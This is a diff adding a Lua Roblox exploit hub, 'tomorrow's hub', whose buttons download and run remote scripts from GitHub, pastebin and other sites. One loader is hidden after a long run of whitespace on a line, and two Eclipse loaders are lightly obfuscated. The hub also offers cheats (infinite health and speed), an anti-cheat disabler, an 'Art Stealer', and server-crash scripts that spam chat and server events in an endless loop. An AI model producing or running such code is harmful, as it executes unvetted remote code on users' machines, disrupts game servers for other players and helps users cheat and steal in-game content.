@@ -1,1 +1,449 @@
--- Down --
+-- We've Switched To Orion Library! --
+local plrs = game:GetService("Players")
+local plr = game:GetService("Players").LocalPlayer
+local char = plr.Character
+local store = getfenv().TomorrowsHubMainStore
+local Library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/hub/main/CheckForCurrentPlayer"))()
+local Window = Library:MakeWindow({Name = "tomorrow's hub"})
+local Home = Window:MakeTab({
+	Name = "Home",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+local ClientInfo = Window:MakeTab({
+	Name = "Client Info",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+local GameScripts = Window:MakeTab({
+	Name = "Game Scripts",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+local LocalPlayerSettings = Window:MakeTab({
+	Name = "Local Player Settings",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+local FEScripts = Window:MakeTab({
+	Name = "FE Scripts R6",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+local OtherScripts = Window:MakeTab({
+	Name = "Other Scripts",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+local MMZWRDMyScripts = Window:MakeTab({
+	Name = "MMZ+WRD+MY Scripts",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+
+local NwekoSimwulator = Window:MakeTab({
+	Name = "Nweko Simwulator",
+	Icon = "rbxassetid://9450522124",
+	PremiumOnly = false,
+})
+ClientInfo:AddLabel("RBXL_HWID/RBXL_CLIENT_ID:")
+ClientInfo:AddLabel(game:GetService("RbxAnalyticsService"):GetClientId())
+ClientInfo:AddLabel("Account Age: "..plr.AccountAge)
+ClientInfo:AddLabel("UserName: "..plr.Name)
+ClientInfo:AddLabel("UserId: "..plr.UserId)
+--ClientInfo:NewLabel("Country: "..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(plr))
+Home:AddLabel("Tomorrow's Hub, Made By Tomorrow (tmbmoordenaarsalt)")
+Home:AddLabel("discord.gg/hTCXEFC6mH")
+Home:AddLabel("Owner is the D1SABL3D 3CH0 Dude")
+Home:AddLabel("Want a script to be in this Hub? Submit the game at Our Discord Server and we'll find a script for it!")
+Home:AddLabel("LocalPlayer Settings Not Working? Reload The Hub.")
+
+GameScripts:AddButton({
+	Name = "Arsenal",
+	Callback = function()
+		loadstring(game:HttpGet("https://narwhalhacks.xyz/scripts/Arsenal.lua", true))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Timber",
+	Callback = function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Fluxxx222/Timber-Gui/main/TimberGui'))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Timber2",
+	Callback = function()
+		loadstring(game:HttpGet(("https://raw.githubusercontent.com/drakker33/rblx-timber/main/Timber.lua"), true))()
+	end
+})
+GameScripts:AddButton({
+	Name = "PSX Proxo Premium",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Pojken123/psxx/main/p"))()
+	end
+})
+GameScripts:AddButton({
+	Name = "PSX Bad Autofarm",
+	Callback = function()
+		loadstring(game:HttpGet('https://pastebin.com/raw/M4RFcyex'))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Natur Disasters",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
+	end
+})
+GameScripts:AddButton({
+	Name = "LiveTopia",
+	Callback = function()
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/64688239cb733cb02ef020cc226de57b/raw/404308ff851a0015590c218ffea2071b7d7f6b47/hhrh", true))() 
+	end
+})
+GameScripts:AddButton({
+	Name = "Prision Life",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEPrisionLife"))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Da Hood",
+	Callback = function()
+		_G.Toggles = "V"
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Bee Swarm Simulator",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/BeeSwarm"))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Adopt Me",
+	Callback = function()
+		getgenv().mainKey = "nil"
+		local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+	end
+})
+GameScripts:AddButton({
+	Name = "Natur Disasters 2",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/NaturDisastersSurvival"))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Mad City",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/MadCity"))()
+	end
+})
+GameScripts:AddButton({
+	Name = "Murder Mystery 2",
+	Callback = function()
+		getgenv().mainKey = "nil"
+		local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+	end
+})
+
+LocalPlayerSettings:AddButton({
+	Name = "Refresh Character",
+	Callback = function()
+		char = plr.Character
+		local char = plr.Character
+	end
+})
+LocalPlayerSettings:AddDropdown({
+	Name = "Health Type",
+	Default = "x1",
+	Options = {"x1", "x2", "x3", "x4", "x5", "inf"},
+	Callback = function(val)
+		if val == "x1" then plr.Character.Humanoid.MaxHealth = "100" plr.Character.Humanoid.Health = "100" end
+		if val == "x2" then plr.Character.Humanoid.MaxHealth = "200" plr.Character.Humanoid.Health = "200" end
+		if val == "x3" then plr.Character.Humanoid.MaxHealth = "300" plr.Character.Humanoid.Health = "300" end
+		if val == "x4" then plr.Character.Humanoid.MaxHealth = "400" plr.Character.Humanoid.Health = "400" end
+		if val == "x5" then plr.Character.Humanoid.MaxHealth = "500" plr.Character.Humanoid.Health = "500" end
+		if val == "x3" then plr.Character.Humanoid.MaxHealth = math.huge plr.Character.Humanoid.Health = math.huge end
+	end
+})
+LocalPlayerSettings:AddDropdown({
+	Name = "WalkSpeed",
+	Default = "x1",
+	Options = {"x1", "x2", "x3", "x4", "x5", "9B"},
+	Callback = function(val)
+		if val == "x1" then plr.Character.Humanoid.WalkSpeed = "16" end
+		if val == "x2" then plr.Character.Humanoid.WalkSpeed = "32" end
+		if val == "x3" then plr.Character.Humanoid.WalkSpeed = "48" end
+		if val == "x4" then plr.Character.Humanoid.WalkSpeed = "64" end
+		if val == "x5" then plr.Character.Humanoid.WalkSpeed = "80" end
+		if val == "9B" then plr.Character.Humanoid.WalkSpeed = "9e9" end
+	end
+})
+LocalPlayerSettings:AddDropdown({
+	Name = "JumpPower",
+	Default = "x1",
+	Options = {"x1", "x2", "x3", "x4", "x5", "9B"},
+	Callback = function(val)
+		plr.Character.Humanoid.UseJumpPower = true
+		if val == "x1" then plr.Character.Humanoid.JumpPower = "50" end
+		if val == "x2" then plr.Character.Humanoid.JumpPower = "100" end
+		if val == "x3" then plr.Character.Humanoid.JumpPower = "150" end
+		if val == "x4" then plr.Character.Humanoid.JumpPower = "200" end
+		if val == "x5" then plr.Character.Humanoid.JumpPower = "250" end
+		if val == "9B" then plr.Character.Humanoid.JumpPower = "9e9" end
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Animations",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEAnimations"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Ball",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEBall"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Dog",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEDog"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Ender",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEEnder"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Flip",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEFlip"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Joy",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEJoy"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Memeus",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEMemeus"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Reanimation",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEReanimation"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Netless",
+	Callback = function()
+		for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
+		if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
+		game:GetService("RunService").Heartbeat:connect(function()
+		v.Velocity = Vector3.new(-30,0,0)
+		end)
+		end
+		end
+		game:GetService("StarterGui"):SetCore("SendNotification", { 
+		Title = "Notification";
+		Text = "Netless Ran";
+		Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+		Duration = 16;
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Sanesss",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FESanesss"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Server Admin",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ONEReverseCard/My-Scripts/main/Netless%20Server%20Admin.md"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Sonic",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FESonic"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Spider",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FESpider"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Xester",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FEXester"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Neko Animations",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FENekoAnims"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Suicide Gun",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/TomorrowsHubMain/main/FESuicideGun"))()
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Da Feets",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/DaFeets"))() 
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Saitama",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/Saitama"))() 
+	end
+})
+FEScripts:AddButton({
+	Name = "FE Sit",
+	Callback = function()
+		game:GetService("Players").LocalPlayer.Character.Humanoid.Sit = true
+	end
+})
+OtherScripts:AddButton({
+	Name = "Domain X",
+	Callback = function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexsoftworks/Domain/main/source'),true))()
+	end
+})
+OtherScripts:AddButton({
+	Name = "Domain V1",
+	Callback = function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexsoftworks/mainDomain/main/source'),true))()
+	end
+})
+OtherScripts:AddButton({
+	Name = "Backdoor Scan",
+	Callback = function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua',true))()
+	end
+})
+OtherScripts:AddButton({
+	Name = "Vape V4",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
+	end
+})
+OtherScripts:AddButton({
+	Name = "Layered Clothing Crash Server",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/FECrash"))()
+	end
+})
+MMZWRDMyScripts:AddButton({
+	Name = "Starving Artists Art Stealer",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/StarvingArtists"))() 
+	end
+})
+MMZWRDMyScripts:AddButton({
+	Name = "FE Stand (Hats: https://bit.ly/3uOOiOc)",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/FEStandLoader"))() 
+	end
+})
+MMZWRDMyScripts:AddButton({
+	Name = "Disable Jy's Anti Cheat",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/DisableJysAntiCheat"))() 
+	end
+})
+MMZWRDMyScripts:AddButton({
+	Name = "Animation Changer",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/AnimChanger"))() 
+	end
+})
+MMZWRDMyScripts:AddButton({
+	Name = "Animation Changer",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TomorrowsHubAKASomeRandomKid7/Hub261666/main/AnimChanger"))() 
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Crash Server",
+	Callback = function()
+		while wait() do
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Crashing Server! Made By Tomorrow / tmbmoordenaarsalt! Crashing Server! Made By Tomorrow / tmbmoordenaarsalt! Crashing Server! Made By Tomorrow / tmbmoordenaarsalt!", "All")
+            game:GetService("ReplicatedStorage").GivePuroScriptEvent:FireServer()
+            game:GetService("ReplicatedStorage").GivePurpProtoScriptEvent:FireServer()
+            game:GetService("ReplicatedStorage").GiveHunterScriptEvent:FireServer()
+            game:GetService("ReplicatedStorage").GiveNicoScriptEvent:FireServer()
+            game:GetService("ReplicatedStorage").GiveCandyScriptEvent:FireServer()
+            game:GetService("ReplicatedStorage").GiveFrostScriptEvent:FireServer()
+            game:GetService("ReplicatedStorage").GiveWilsonScriptEvent:FireServer()
+        end
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Neko God/Error Neko",
+	Callback = function()
+		game.ReplicatedStorage.GivePuroScriptEvent:FireServer()
+		game.ReplicatedStorage.GivePurpProtoScriptEvent:FireServer()
+		game.ReplicatedStorage.GiveHunterScriptEvent:FireServer()
+		game.ReplicatedStorage.GiveNicoScriptEvent:FireServer()
+		game.ReplicatedStorage.GiveCandyScriptEvent:FireServer()
+		game.ReplicatedStorage.GiveFrostScriptEvent:FireServer()
+		game.ReplicatedStorage.GiveWilsonScriptEvent:FireServer()
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Puro Neko",
+	Callback = function()
+		game.ReplicatedStorage.GivePuroScriptEvent:FireServer()
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Purple Protogen Neko",
+	Callback = function()
+		game.ReplicatedStorage.GivePurpProtoScriptEvent:FireServer()
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Hunter Neko",
+	Callback = function()
+		game.ReplicatedStorage.GiveHunterScriptEvent:FireServer()
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Nico Neko",
+	Callback = function()
+		game.ReplicatedStorage.GiveNicoScriptEvent:FireServer()
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Candy Neko",
+	Callback = function()
+		game.ReplicatedStorage.GiveCandyScriptEvent:FireServer()
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Frost Neko",
+	Callback = function()
+		game.ReplicatedStorage.GiveFrostScriptEvent:FireServer()
+	end
+})
+NwekoSimwulator:AddButton({
+	Name = "Wilson Neko",
+	Callback = function()
+		game.ReplicatedStorage.GiveWilsonScriptEvent:FireServer()
+	end
+})
